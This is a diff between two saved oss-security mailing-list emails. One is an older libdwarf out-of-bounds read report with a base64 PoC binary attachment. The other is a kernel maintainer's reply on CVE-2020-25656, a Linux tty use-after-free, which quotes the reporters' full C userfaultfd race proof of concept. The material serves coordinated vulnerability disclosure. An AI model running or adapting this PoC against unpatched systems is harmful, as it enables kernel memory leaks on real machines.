@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["17355" "Tuesday" "19" "January" "2016" "20:46:10" "+0800" "xiaoqixue_1" "xiaoqixue_1@163.com" "<5e818bea.124fe.15259ebc9f3.Coremail.xiaoqixue_1@163.com>" "299" "[oss-security] Re:[oss-security] Re: Buffer Overflow in lha compression utility" nil nil nil "1" "2016011912:46:10" "[oss-security] Re:[oss-security] Re: Buffer Overflow in lha compression utility" (number mark "U       xiaoqixue_1@ Jan 19  299/17355 " thread-indent "\"[oss-security] Re:[oss-security] Re: Buffer Overflow in lha compression utility\"\n") "<20160118185441.EB3FE6C00B2@smtpvmsrv1.mitre.org>" ("<20160118185441.EB3FE6C00B2@smtpvmsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["8043" "Friday" "16" "October" "2020" "08:58:34" "+0200" "Jiri Slaby" "jirislaby@kernel.org" "<09826e03-525c-d307-5bfe-f51cb9298e1f@kernel.org>" "231" "Re: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" nil nil nil "10" "2020101606:58:34" "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" (number mark "U       jirislaby@ke Oct 16  231/8043  " thread-indent "\"Re: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl\"\n") "<CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !\n gmail ! com>" ("<CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !\n gmail ! com>") nil nil nil nil nil nil nil "Re: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32078 invoked by uid 550); 19 Jan 2016 12:46:30 -0000
+Received: (qmail 18325 invoked by uid 550); 16 Oct 2020 07:33:50 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,329 +12,271 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32046 invoked from network); 19 Jan 2016 12:46:29 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
-	s=s110527; h=Date:From:Subject:MIME-Version:Message-ID; bh=tqmMV
-	6LPaioc8Gm/Qx3uV2PFYkYsdm4BgJNDC9LMoUI=; b=hCtSGqu7G26K/7CCfZryw
-	JK93lKSlm0JSYboSSPQ0k42fAJkblfeh5HJhBMMf3tOQzyE9Q51foXadWTnBNvMb
-	TijauvzR0AZdEoG7254ByXf26I7peRJVoZM7uwyY4+VCnZ18YV1Fr3khaxE7vvbt
-	7PIqvp5v6nQT3tcKyI1kQ0=
-X-Originating-IP: [166.111.131.12, 54.215.2.217, 10.144.1.72]
-Date: Tue, 19 Jan 2016 20:46:10 +0800 (CST)
-From: xiaoqixue_1  <xiaoqixue_1@163.com>
-To: oss-security@lists.openwall.com
-Cc: cve-assign@mitre.org
-X-Priority: 3
-X-Mailer: Coremail Webmail Server Version SP_ntes V3.5 build
- 20150911(74783.7961) Copyright (c) 2002-2016 www.mailtech.cn 163com
-In-Reply-To: <20160118185441.EB3FE6C00B2@smtpvmsrv1.mitre.org>
-References: <20160118185441.EB3FE6C00B2@smtpvmsrv1.mitre.org>
-X-CM-CTRLDATA: sr9dhWZvb3Rlcl9odG09MjU3Mzo1Ng==
-Content-Type: multipart/mixed; 
-	boundary="----=_Part_353680_16903579.1453207570930"
+Received: (qmail 13407 invoked from network); 16 Oct 2020 06:58:47 -0000
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:subject:to:references:from:message-id:date
+         :user-agent:mime-version:in-reply-to:content-language
+         :content-transfer-encoding;
+        bh=+LlmKoINson/n29f4LgBdyByONTxSrfROU25ea+hdu0=;
+        b=b/nQ6Y0cyTQj51BuysrtK1Lwnx6CTYbAGbY0jhPf+WMyHekpIzCK38VTMxqHdMrJvI
+         TVuptb65dhbpL1GzuEtouw7kqAVzE+tgSGEevV4EOnK80g6mYH/cgbFAvMyajDa0gw7T
+         ZGV6qiOA7oi7Oe2lIwZ8ipUUHRS5RnrcVtMrwja/8BCKinxESEyoiArYfmA4c5MmNkyh
+         M0C/mUaoqLXea+H92QGFJ7BFD4zhbfTY/EuoUbCspIf2W8CLLcMHBV4oKNixQ7fDi70g
+         8bt7QOnr9yBfZ+wfwYC8fZlJBI1QajzPYRQYs61/4Z6dLsjGn4n5FU/pDpR94T2RYIlV
+         so0g==
+X-Gm-Message-State: AOAM532rxDpIppDeh7UKQvrgHToPt4yK8NV3A7k+9iiqk67X+WkUKsqX
+	tBa73KyfCPhNIFn1kD9ZmESN8MHdKUw=
+X-Google-Smtp-Source: ABdhPJzBXO2Q6xj6A53lssjuHwdvVgxNpvVeZ6bnEh8fg1VbMsBoUMpThgXgC7WGODimVF9NdOIX4A==
+X-Received: by 2002:a17:906:4b18:: with SMTP id y24mr2371526eju.416.1602831516283;
+        Thu, 15 Oct 2020 23:58:36 -0700 (PDT)
+To: Minh Yuan <yuanmingbuaa@gmail.com>, oss-security@lists.openwall.com,
+ Greg KH <gregkh@linuxfoundation.org>,
+ Linux kernel mailing list <linux-kernel@vger.kernel.org>
+References: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !
+ gmail ! com>
+From: Jiri Slaby <jirislaby@kernel.org>
+Message-ID: <09826e03-525c-d307-5bfe-f51cb9298e1f@kernel.org>
+Date: Fri, 16 Oct 2020 08:58:34 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
+ Thunderbird/78.3.1
 MIME-Version: 1.0
-Message-ID: <5e818bea.124fe.15259ebc9f3.Coremail.xiaoqixue_1@163.com>
-X-CM-TRANSID:ZcGowAAn4ZIUMJ5Wmr0KAA--.62661W
-X-CM-SenderInfo: 50ld015l0xvsqr6rljoofrz/1tbiJRP0vVUL9jGMtQADsc
-X-Coremail-Antispam: 1U5529EdanIXcx71UUUUU7vcSsGvfC2KfnxnUU==
-Subject: [oss-security] Re:[oss-security] Re: Buffer Overflow in lha compression utility
+In-Reply-To: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !
+ gmail ! com>
+Content-Type: text/plain; charset=iso-8859-2; format=flowed
+Content-Language: en-US
+Content-Transfer-Encoding: 7bit
+Subject: Re: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in
+ vt_do_kdgkb_ioctl
 
-------=_Part_353680_16903579.1453207570930
-Content-Type: multipart/alternative; 
-	boundary="----=_Part_353682_844741198.1453207570930"
+Cc Greg.
 
-------=_Part_353682_844741198.1453207570930
-Content-Type: text/plain; charset=GBK
-Content-Transfer-Encoding: base64
+On 16. 10. 20, 5:39, Minh Yuan wrote:
+> Hi,
+> 
+> We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
+> version 3.4 to the latest version (v5.9 for now).
+> 
+> The root cause of this vulnerability is that there exits a race in
+> KDGKBSENT and KDSKBSENT.
+> 
+> Here are details:
+> 1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
+> 2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
+> func_table, at the same time, due to KDGKBSENT has no lock, we can use
+> KDSKBSENT again to allocate a larger buffer than step1, and the old
+> funcbufptr will be freed. However, we've obtained the heap pointer in
+> KDGKBSENT, so a uaf read will happen while executing put_user.
 
-CgphbiBvdXQgb2YgYm91bmQgcmVhZCBpcyBmb3VuZCBpbiBsaWJkd2FyZiAt
-MjAxNTExMTQuCgpwbGVhc2Ugc2VlIGF0dGFjaG1lbnQgZm9yIHBvYy4gdGhl
-IHJlc3VsdCBvZiB2YWxncmluZCBhcyBmb2xsb3dzOgoKPT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09Cj09PT09PT09PT09PT09PT09PT09PT09PT09
-PQoKKioqIERXQVJGIENIRUNLOiBEV19ETEVfREVCVUdfRlJBTUVfTEVOR1RI
-X05PVF9NVUxUSVBMRQpsZW49MHgwMDAwMDAxMCwgbGVuIHNpemU9MHgwMDAw
-MDAwNCwgZXh0biBzaXplPTB4MDAwMDAwMDAsIHRvdGwKbGVuZ3RoPTB4MDAw
-MDAwMTQsIGFkZHIgc2l6ZT0weDAwMDAwMDA4LCBtb2Q9MHgwMDAwMDAwNCBt
-dXN0IGJlIHplcm8KaW4gY2llLCBvZmZzZXQgMHgwMDAwMDAwMC4gKioqCjcg
-ICA9PTUzNDk1PT0gSW52YWxpZCByZWFkIG9mIHNpemUgMgogIDEgPT01MzQ5
-NT09ICAgIGF0IDB4NEMyRjdFMDogbWVtY3B5QEBHTElCQ18yLjE0IChpbgov
-dXNyL2xpYi92YWxncmluZC92Z3ByZWxvYWRfbWVtY2hlY2stYW1kNjQtbGlu
-dXguc28pCiAgMiA9PTUzNDk1PT0gICAgYnkgMHg0MzI4N0Y6IGR3YXJmX3Jl
-YWRfY2llX2ZkZV9wcmVmaXggKGR3YXJmX2ZyYW1lMi5jOjkzNCkKICAzID09
-NTM0OTU9PSAgICBieSAweDQzMTMwNTogX2R3YXJmX2dldF9mZGVfbGlzdF9p
-bnRlcm5hbCAoZHdhcmZfZnJhbWUyLmM6MjY4KQogIDQgPT01MzQ5NT09ICAg
-IGJ5IDB4NDJFQjVGOiBkd2FyZl9nZXRfZmRlX2xpc3RfZWggKGR3YXJmX2Zy
-YW1lLmM6MTEwMSkKICA1ID09NTM0OTU9PSAgICBieSAweDQxQkFCRTogcHJp
-bnRfZnJhbWVzIChwcmludF9mcmFtZXMuYzoxODM1KQogIDYgPT01MzQ5NT09
-ICAgIGJ5IDB4NDA0ODVCOiBwcm9jZXNzX29uZV9maWxlIChkd2FyZmR1bXAu
-YzoxMzIzKQogIDcgPT01MzQ5NT09ICAgIGJ5IDB4NDAzNTI5OiBtYWluIChk
-d2FyZmR1bXAuYzo2MzApCiAgOCA9PTUzNDk1PT0gIEFkZHJlc3MgMHg1NDhi
-M2MwIGlzIDAgYnl0ZXMgaW5zaWRlIGEgYmxvY2sgb2Ygc2l6ZSAxIGFsbG9j
-J2QKICA5ID09NTM0OTU9PSAgICBhdCAweDRDMkFCODA6IG1hbGxvYyAoaW4K
-L3Vzci9saWIvdmFsZ3JpbmQvdmdwcmVsb2FkX21lbWNoZWNrLWFtZDY0LWxp
-bnV4LnNvKQogMTAgPT01MzQ5NT09ICAgIGJ5IDB4NEU0MDYwMDogPz8/IChp
-bgovdXNyL2xpYi94ODZfNjQtbGludXgtZ251L2xpYmVsZi0wLjE1OC5zbykK
-IDExID09NTM0OTU9PSAgICBieSAweDRFNDA4NzM6ID8/PyAoaW4KL3Vzci9s
-aWIveDg2XzY0LWxpbnV4LWdudS9saWJlbGYtMC4xNTguc28pCiAxMiA9PTUz
-NDk1PT0gICAgYnkgMHg0MkEwRTE6IGR3YXJmX2VsZl9vYmplY3RfYWNjZXNz
-X2xvYWRfc2VjdGlvbgooZHdhcmZfZWxmX2FjY2Vzcy5jOjEyMzApCiAxMyA9
-PTUzNDk1PT0gICAgYnkgMHg0Mzc3MTU6IF9kd2FyZl9sb2FkX3NlY3Rpb24g
-KGR3YXJmX2luaXRfZmluaXNoLmM6MTA3MikKIDE0ID09NTM0OTU9PSAgICBi
-eSAweDQyRUFFQjogZHdhcmZfZ2V0X2ZkZV9saXN0X2VoIChkd2FyZl9mcmFt
-ZS5jOjEwOTYpCiAxNSA9PTUzNDk1PT0gICAgYnkgMHg0MUJBQkU6IHByaW50
-X2ZyYW1lcyAocHJpbnRfZnJhbWVzLmM6MTgzNSkKIDE2ID09NTM0OTU9PSAg
-ICBieSAweDQwNDg1QjogcHJvY2Vzc19vbmVfZmlsZSAoZHdhcmZkdW1wLmM6
-MTMyMykKIDE3ID09NTM0OTU9PSAgICBieSAweDQwMzUyOTogbWFpbiAoZHdh
-cmZkdW1wLmM6NjMwKQogMTggPT01MzQ5NT09CgoKVGhlIHZ1bG5lcmFiaWxp
-dHkgaXMgZm91bmQgYnkgUWl4dWUgWGlhbywgYXQgVHNpbmdodWEgVW5pdmVy
-c2l0eS4KCgoKCg==
+Hi,
 
-------=_Part_353682_844741198.1453207570930
-Content-Type: text/html; charset=GBK
-Content-Transfer-Encoding: base64
+this is likely the issue I am fixing at:
+https://git.kernel.org/pub/scm/linux/kernel/git/jirislaby/linux.git/commit/?h=devel&id=57c85191e788e172a446e34ef77d34473cfb1e8d
 
-PGRpdiBzdHlsZT0ibGluZS1oZWlnaHQ6MS43O2NvbG9yOiMwMDAwMDA7Zm9u
-dC1zaXplOjE0cHg7Zm9udC1mYW1pbHk6QXJpYWwiPjxkaXY+PGJyPjxicj5h
-biBvdXQgb2YgYm91bmQgcmVhZCBpcyBmb3VuZCBpbiBsaWJkd2FyZiAtMjAx
-NTExMTQuPGJyPgo8YnI+cGxlYXNlIHNlZSBhdHRhY2htZW50IGZvciBwb2Mu
-IHRoZSByZXN1bHQgb2YgdmFsZ3JpbmQgYXMgZm9sbG93czo8YnI+Cjxicj4K
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PGRpdiBpZD0iOnNtIiBj
-bGFzcz0iYTNzIj48d2JyPjwvd2JyPj09PT09PT09PT09PT09PT09PT09PT09
-PT09PTxicj4KPGJyPgoqKiogRFdBUkYgQ0hFQ0s6IERXX0RMRV9ERUJVR19G
-UkFNRV9MRU5HVEhfTk9UXzx3YnI+PC93YnI+TVVMVElQTEU8YnI+Cmxlbj0w
-eDAwMDAwMDEwLCBsZW4gc2l6ZT0weDAwMDAwMDA0LCBleHRuIHNpemU9MHgw
-MDAwMDAwMCwgdG90bDxicj4KbGVuZ3RoPTB4MDAwMDAwMTQsIGFkZHIgc2l6
-ZT0weDAwMDAwMDA4LCBtb2Q9MHgwMDAwMDAwNCBtdXN0IGJlIHplcm88YnI+
-CmluIGNpZSwgb2Zmc2V0IDB4MDAwMDAwMDAuICoqKjxicj4KNyZuYnNwOyAm
-bmJzcDs9PTUzNDk1PT0gSW52YWxpZCByZWFkIG9mIHNpemUgMjxicj4KJm5i
-c3A7IDEgPT01MzQ5NT09Jm5ic3A7ICZuYnNwOyBhdCAweDRDMkY3RTA6IG1l
-bWNweUBAR0xJQkNfMi4xNCAoaW48YnI+Ci91c3IvbGliL3ZhbGdyaW5kL3Zn
-cHJlbG9hZF88d2JyPjwvd2JyPm1lbWNoZWNrLWFtZDY0LWxpbnV4LnNvKTxi
-cj4KJm5ic3A7IDIgPT01MzQ5NT09Jm5ic3A7ICZuYnNwOyBieSAweDQzMjg3
-RjogZHdhcmZfcmVhZF9jaWVfZmRlX3ByZWZpeCAoZHdhcmZfZnJhbWUyLmM6
-OTM0KTxicj4KJm5ic3A7IDMgPT01MzQ5NT09Jm5ic3A7ICZuYnNwOyBieSAw
-eDQzMTMwNTogX2R3YXJmX2dldF9mZGVfbGlzdF9pbnRlcm5hbCAoZHdhcmZf
-ZnJhbWUyLmM6MjY4KTxicj4KJm5ic3A7IDQgPT01MzQ5NT09Jm5ic3A7ICZu
-YnNwOyBieSAweDQyRUI1RjogZHdhcmZfZ2V0X2ZkZV9saXN0X2VoIChkd2Fy
-Zl9mcmFtZS5jOjExMDEpPGJyPgombmJzcDsgNSA9PTUzNDk1PT0mbmJzcDsg
-Jm5ic3A7IGJ5IDB4NDFCQUJFOiBwcmludF9mcmFtZXMgKHByaW50X2ZyYW1l
-cy5jOjE4MzUpPGJyPgombmJzcDsgNiA9PTUzNDk1PT0mbmJzcDsgJm5ic3A7
-IGJ5IDB4NDA0ODVCOiBwcm9jZXNzX29uZV9maWxlIChkd2FyZmR1bXAuYzox
-MzIzKTxicj4KJm5ic3A7IDcgPT01MzQ5NT09Jm5ic3A7ICZuYnNwOyBieSAw
-eDQwMzUyOTogbWFpbiAoZHdhcmZkdW1wLmM6NjMwKTxicj4KJm5ic3A7IDgg
-PT01MzQ5NT09Jm5ic3A7IEFkZHJlc3MgMHg1NDhiM2MwIGlzIDAgYnl0ZXMg
-aW5zaWRlIGEgYmxvY2sgb2Ygc2l6ZSAxIGFsbG9jJ2Q8YnI+CiZuYnNwOyA5
-ID09NTM0OTU9PSZuYnNwOyAmbmJzcDsgYXQgMHg0QzJBQjgwOiBtYWxsb2Mg
-KGluPGJyPgovdXNyL2xpYi92YWxncmluZC92Z3ByZWxvYWRfPHdicj48L3di
-cj5tZW1jaGVjay1hbWQ2NC1saW51eC5zbyk8YnI+CiZuYnNwOzEwID09NTM0
-OTU9PSZuYnNwOyAmbmJzcDsgYnkgMHg0RTQwNjAwOiA/Pz8gKGluPGJyPgov
-dXNyL2xpYi94ODZfNjQtbGludXgtZ251LzxhIGhyZWY9Imh0dHA6Ly9saWJl
-bGYtMC4xNTguc28iIHJlbD0ibm9yZWZlcnJlciIgdGFyZ2V0PSJfYmxhbmsi
-PmxpYmU8d2JyPjwvd2JyPmxmLTAuMTU4LnNvPC9hPik8YnI+CiZuYnNwOzEx
-ID09NTM0OTU9PSZuYnNwOyAmbmJzcDsgYnkgMHg0RTQwODczOiA/Pz8gKGlu
-PGJyPgovdXNyL2xpYi94ODZfNjQtbGludXgtZ251LzxhIGhyZWY9Imh0dHA6
-Ly9saWJlbGYtMC4xNTguc28iIHJlbD0ibm9yZWZlcnJlciIgdGFyZ2V0PSJf
-YmxhbmsiPmxpYmU8d2JyPjwvd2JyPmxmLTAuMTU4LnNvPC9hPik8YnI+CiZu
-YnNwOzEyID09NTM0OTU9PSZuYnNwOyAmbmJzcDsgYnkgMHg0MkEwRTE6IGR3
-YXJmX2VsZl9vYmplY3RfYWNjZXNzX2xvYWRfPHdicj48L3dicj5zZWN0aW9u
-PGJyPgooZHdhcmZfZWxmX2FjY2Vzcy5jOjEyMzApPGJyPgombmJzcDsxMyA9
-PTUzNDk1PT0mbmJzcDsgJm5ic3A7IGJ5IDB4NDM3NzE1OiBfZHdhcmZfbG9h
-ZF9zZWN0aW9uIChkd2FyZl9pbml0X2ZpbmlzaC5jOjEwNzIpPGJyPgombmJz
-cDsxNCA9PTUzNDk1PT0mbmJzcDsgJm5ic3A7IGJ5IDB4NDJFQUVCOiBkd2Fy
-Zl9nZXRfZmRlX2xpc3RfZWggKGR3YXJmX2ZyYW1lLmM6MTA5Nik8YnI+CiZu
-YnNwOzE1ID09NTM0OTU9PSZuYnNwOyAmbmJzcDsgYnkgMHg0MUJBQkU6IHBy
-aW50X2ZyYW1lcyAocHJpbnRfZnJhbWVzLmM6MTgzNSk8YnI+CiZuYnNwOzE2
-ID09NTM0OTU9PSZuYnNwOyAmbmJzcDsgYnkgMHg0MDQ4NUI6IHByb2Nlc3Nf
-b25lX2ZpbGUgKGR3YXJmZHVtcC5jOjEzMjMpPGJyPgombmJzcDsxNyA9PTUz
-NDk1PT0mbmJzcDsgJm5ic3A7IGJ5IDB4NDAzNTI5OiBtYWluIChkd2FyZmR1
-bXAuYzo2MzApPGJyPgombmJzcDsxOCA9PTUzNDk1PT08L2Rpdj48YnI+PGJy
-PlRoZSB2dWxuZXJhYmlsaXR5IGlzIGZvdW5kIGJ5IFFpeHVlIFhpYW8sIGF0
-IFRzaW5naHVhIFVuaXZlcnNpdHkuPGJyPjxicj48YnI+PGJyPjxicj48L2Rp
-dj48L2Rpdj48YnI+PGJyPjxzcGFuIHRpdGxlPSJuZXRlYXNlZm9vdGVyIj48
-cD4mbmJzcDs8L3A+PC9zcGFuPg==
+I think, it won't apply cleanly as it's a part of a larger set. I will 
+reorder the patch and send something during the day.
 
-------=_Part_353682_844741198.1453207570930--
+Thanks.
 
-------=_Part_353680_16903579.1453207570930
-Content-Type: application/octet-stream; name="awbug5.elf"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="awbug5.elf"
+> I've successfully reproduced this bug in a special way.
+> However, to write a universal PoC for anyone else to reproduce it,  I use
+> userfaultfd to handle the order of "free" and "use" in multithreading
+> environment. This is my PoC:
+> 
+> // author by ziiiro@thu
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <unistd.h>
+> #include <sys/ioctl.h>
+> #include <string.h>
+> #include <sys/types.h>
+> #include <sys/stat.h>
+> #include <fcntl.h>
+> #include <sys/mman.h>
+> #include <poll.h>
+> #include <pthread.h>
+> #include <errno.h>
+> #include <stdlib.h>
+> #include <signal.h>
+> #include <string.h>
+> #include <sys/syscall.h>
+> #include <linux/userfaultfd.h>
+> #include <pthread.h>
+> #include <poll.h>
+> #include <linux/prctl.h>
+> #include <stdint.h>
+> 
+> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
+>                         } while (0)
+> 
+> #define KDGKBSENT 0x4B48 /* gets one function key string entry */
+> #define KDSKBSENT 0x4B49 /* sets one function key string entry */
+> 
+> struct kbsentry {
+> unsigned char kb_func;
+> unsigned char kb_string[512];
+> };
+> int fd;
+> static int page_size;
+> static void *fault_handler_thread(void *arg) {
+>    unsigned long value;
+>    static struct uffd_msg msg;
+>    static int fault_cnt = 0;
+>    long uffd;
+>    static char *page = NULL;
+>    struct uffdio_copy uffdio_copy;
+>    int len, i;
+>    if (page == NULL) {
+>      page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+>                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+>      if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
+>    }
+>    uffd = (long)arg;
+> 
+>    for(;;) {
+>      struct pollfd pollfd;
+>      pollfd.fd = uffd;
+>      pollfd.events = POLLIN;
+>      len = poll(&pollfd, 1, -1);
+> 
+> 
+>      read(uffd, &msg, sizeof(msg));
+>      printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
+>      printf("    address = 0x%lx\n", msg.arg.pagefault.address);
+>      switch(fault_cnt) {
+>          case 0:
+>              puts("triggered in the first page!");
+>              break;
+>          case 1:
+>              puts("triggered in the seccond page!");
+>              munmap((void*)0x233000,page_size);
+>              void *addr = (void*)mmap((void*)0x233000,
+>                          page_size,
+>                          PROT_READ | PROT_WRITE,
+>                          MAP_FIXED | MAP_PRIVATE | MAP_ANON,
+>                          -1, 0);
+>              if ((unsigned long)addr != 0x233000)
+>                  errExit("mmap (0x233000)");
+>              // register 0x233000 again to trigger put_user
+>              struct uffdio_register uffdio_register;
+>              uffdio_register.range.start = (unsigned long)addr;
+>              uffdio_register.range.len   = page_size;
+>              uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
+>              if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+>                  errExit("ioctl: UFFDIO_REGITER");
+>              break;
+>          case 2:
+>              puts("triggered in put_user!");
+>              struct kbsentry *kbs;
+>              kbs = malloc(sizeof(struct kbsentry));
+>              kbs->kb_func = 0;
+> 
+> strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
+> bbbbbbbbb");
+>              // free old funcbufptr
+>              ioctl(fd,KDSKBSENT,kbs);
+>              break;
+> 
+>      }
+>      // return to kernel-land
+>      uffdio_copy.src = (unsigned long)page;
+>      uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
+> ~(page_size - 1);
+>      uffdio_copy.len = page_size;
+>      uffdio_copy.mode = 0;
+>      uffdio_copy.copy = 0;
+>      if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+>          errExit("ioctl: UFFDIO_COPY");
+> 
+>      fault_cnt++;
+> 
+>    }
+> }
+> // use userfaultfd to handle free->use
+> void setup_pagefault(void *addr, unsigned size) {
+>    long uffd;
+>    pthread_t th;
+>    struct uffdio_api uffdio_api;
+>    struct uffdio_register uffdio_register;
+>    int s;
+>    // new userfaulfd
+> 
+>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+>    if (uffd == -1) errExit("userfaultfd");
+>    // enabled uffd object
+>    uffdio_api.api = UFFD_API;
+>    uffdio_api.features = 0;
+>    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
+> UFFDIO_API");
+>    // register memory address
+>    uffdio_register.range.start = (unsigned long)addr;
+>    uffdio_register.range.len   = size;
+>    uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
+> //UFFDIO_REGISTER_MODE_WP;//
+>    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("io=
+> ctl:
+> UFFDIO_REGITER");
+>    // monitor page fault
+>    s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
+>    if (s != 0) errExit("pthread_create");
+> }
+> 
+> 
+> int main(int argc, char** argv)
+> {
+>          struct kbsentry *kbs;
+>          pthread_t th;
+>          page_size = sysconf(_SC_PAGE_SIZE);
+>          void *addr = (void*)mmap((void*)0x233000,
+>                              page_size * 2,
+>                              PROT_READ | PROT_WRITE,
+>                              MAP_FIXED | MAP_PRIVATE | MAP_ANON,
+>                              -1, 0);
+>          if ((unsigned long)addr != 0x233000)
+>              errExit("mmap (0x233000)");
+>          setup_pagefault(addr, page_size * 2);
+>          kbs = malloc(sizeof(struct kbsentry));
+>          kbs->kb_func = 0;
+>          fd = open("/dev/tty1", O_RDONLY, 0);
+> 
+> strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
+> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
+> a");
+>          // allocate a lager funcbufptr
+>          ioctl(fd,KDSKBSENT,kbs);
+>          // use KDGKBSENT to access the new funcbufptr
+>          ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
+>          return 1;
+> 
+> }
+> 
+> Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=y
+> is also needed. Besides, it needs the privilege to access tty to trigger
+> this bug.
+> 
+> We've noticed that this bug was also discovered by Syzbot 8 months ago, but
+> no one has successfully reproduced it (
+> https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
+> leaving this issue ignored and upatched yet. Hope this PoC can help
+> someone.
+> 
+> Timeline:
+> * 10.15.20 - Vulnerability reported to security@kernel.org and
+> linux-distros@vs.openwall.org.
+> * 10.15.20 - CVE-2020-25656 assigned.
+> * 10.16.20 - Vulnerability opened.
+> 
+> Thanks,
+> Yuan Ming and Bodong Zhao, Tsinghua University
+> 
 
-f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAQARAAAAAAABAAAAAAAAAAKANAAAA
-AAAAAAAAAEAAOAAIAEAAIgAfAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAA
-QAAAAAAAwAEAAAAAAADAAQAAAAAAAAgAAAAAAAAAAwAAAAQAAAAAAgAAAAAA
-AAACQAAAAAAAAAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAAAAAAAAABAAAA
-BQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAIAGAAAAAAAAgAYAAAAAAAAA
-ACAAAAAAAAEAAAAGAAAAgAYAAAAAAACABmAAAAAAAIAGYAAAAAAAMAMAAAAA
-AAAwAwAAAAAAAAAAIAAAAAAAAgAAAAYAAADABwAAAAAAAMAHYAAAAAAAwAdg
-AAAAAACQAQAAAAAAAJABAAAAAAAACAAAAAAAAAAEAAAABAAAABwCAAAAAAAA
-HAJAAAAAAAAcAkAAAAAAACAAAAAAAAAAIAAAAAAAAAAEAAAAAAAAAFDldGQE
-AAAATAYAAAAAAABMBkAAAAAAAEwGQAAAAAAANAAAAAAAAAA0AAAAAAAAAAQA
-AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAEAAAAAAAAAAvbGliNjQvbGQtbGludXgteDg2LTY0LnNvLjIA
-BAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAABgAAAAAAAAAAwAAAAUAAAAE
-AAAAAgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAAAAAAAA
